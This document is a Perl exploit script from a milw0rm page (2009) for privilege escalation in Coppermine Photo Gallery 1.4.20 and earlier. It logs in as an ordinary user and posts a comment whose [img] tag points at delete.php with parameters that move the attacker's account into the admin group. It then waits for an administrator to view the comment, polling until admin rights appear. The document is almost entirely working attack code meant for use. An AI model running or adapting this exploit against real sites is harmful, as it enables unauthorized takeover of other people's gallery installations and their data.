<html><head><title>Coppermine Photo Gallery <= 1.4.20 (IMG) Privilege Escalation Exploit</title></head><pre>#!/usr/bin/perl
#inphex - inphex0 at gmail dot com
#based on http://milw0rm.com/exploits/8114 - found by StAkeR
#In case this does not work check out pos(Line 80) and find another value for it
use IO::Socket;
use LWP::UserAgent;
use LWP::Simple;
use HTTP::Cookies;
$_1 = shift; #[HOST]
$h = ($_1 eq &quot;&quot;?($n = 0):($n = 1));
$_2 = shift; #[PATH]
$_3 = shift; #[ID]
$_4 = shift; #[ALBUMNUM]
$_5 = shift; #[USER]
$_6 = shift; #[PASS]
$d_p = 80;
if (!$_1 || !$_2 ||!$_3 ||!$_4 ||!$_5 ||!$_6) {
	print &quot;perl coppermine host /path/ youruserid albumnum yourusername yourpassword\n&quot;;
	print &quot;perl coppermine host.com /path/ 3 2 inphex 123456&quot;;
	exit;
}
if ($h) {
	$socket = IO::Socket::INET-&gt;new(Proto =&gt; &quot;tcp&quot;,PeerAddr =&gt; $_1, PeerPort =&gt; $d_p) or die(&quot;[-]ERROR&quot;);
	print $socket &quot;GET $_2 HTTP/1.1\n&quot;;
    print $socket &quot;Host: $_1\n&quot;;
    print $socket &quot;Accept: */*\n&quot;;
    print $socket &quot;Connection: close\n\n&quot;;

	while ($answer = &lt;$socket&gt;) {
		$f_answer = $f_answer.$answer;
	}
	$url = &amp;gen_url($_1,$_2,$_3);
	if ($url) {
		$code = &amp;gen_code($url);
		$res = &amp;_send($_1,$_2,$_3,$_4,$code,$_5,$_6);
	}

}

sub gen_url($$$) {
	$h = shift;
	$p = shift;
	$i = shift;
	$url = &quot;http://&quot;.$_1.$_2.&quot;delete.php?id=u&quot;.$i.&quot;&amp;u&quot;.$i.&quot;=&amp;action=change_group&amp;what=user&amp;new_password=&amp;group=1&amp;delete_files=no&amp;delete_comments=no&quot;;
	return $url;
}
sub gen_code($) {
	$url = shift;
	$code = &quot;yoyoyo[img]&quot;.$url.&quot;[/img]&quot;;
	return $code;
}
sub _send($$$$$$$) {
	$h = &quot;http://&quot;.shift;
	$p = shift;
	$i = shift;
	$aid = shift;
	$co = shift;
	$u = shift;
	$pass = shift;

	$xpl = LWP::UserAgent-&gt;new() or die;
	$cookie_jar = HTTP::Cookies-&gt;new();
	$xpl-&gt;cookie_jar( $cookie_jar );
	
	$login = $xpl-&gt;post($h.$p.'login.php?referer=index.php',
		Content =&gt; [
		&quot;username&quot; =&gt; $u,
		&quot;password&quot; =&gt; $pass,
		&quot;submitted&quot; =&gt; &quot;Login&quot;,
		 ],);
	if($cookie_jar-&gt;as_string) {
		$c = 1;
		print &quot;[+]Connected\n&quot;;
		print &quot;[+]Logged in\n&quot;;
	}else {
		$c = 0;
	}
	
	if ($c) {
		$con = get(&quot;&quot;.$h.$p.&quot;displayimage.php?album=&quot;.$aid.&quot;&amp;pos=0&quot;); #pos may be changed
		if ($con =~m/addfav\.php\?pid=(.*?)\&amp;amp/) {
			$p_id = $1;

		}

	}
	
	$se = $xpl-&gt;post($h.$p.'db_input.php',Content_Type =&gt; 'form-data',
		Content =&gt; [
		'msg_author'  =&gt; $u,
		'msg_body' =&gt; $co,
		'event' =&gt; 'comment',
		'pid' =&gt; $p_id,
		'submit' =&gt; &quot;OK&quot;,
		],);
	print &quot;[+]Comment sent\n&quot;;
	print &quot;[/]Waiting for admin to view\n&quot;;
	$| = 0;
	while (1) {
		sleep(20);
		syswrite STDOUT,&quot;-&quot;;
	    $xpl1 = LWP::UserAgent-&gt;new() or die;
	    $cookie_jar1 = HTTP::Cookies-&gt;new();
	    $xpl1-&gt;cookie_jar( $cookie_jar1 );
		$_con = get(&quot;&quot;.$h.$p.&quot;logout.php?referer=index.php&quot;);
		$login = $xpl1-&gt;post($h.$p.'login.php?referer=index.php',
		    Content =&gt; [
		    &quot;username&quot; =&gt; $u,
		    &quot;password&quot; =&gt; $pass,
		    &quot;submitted&quot; =&gt; &quot;Login&quot;,
			],);

		$const = $xpl1-&gt;get($h.$p.&quot;index.php&quot;);
		if ($const-&gt;as_string =~m/Config/) {
			print &quot;\n[+]You just gained Admin Privileges&quot;;
			exit;
		}
	}
}

# milw0rm.com [2009-02-26]</pre></html>